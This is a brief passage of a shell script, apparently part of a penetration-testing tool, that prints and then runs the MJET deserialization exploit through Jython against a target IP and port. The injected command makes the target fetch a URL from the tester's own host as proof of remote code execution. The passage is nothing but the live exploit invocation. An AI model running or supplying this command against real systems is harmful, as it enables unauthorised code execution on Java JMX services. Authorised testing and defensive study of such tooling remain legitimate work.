...
print_info "jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} \"curl http://${LOCALIP}:8888/testexploit1337\""
jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} "curl http://${LOCALIP}:8888/testexploit1337"
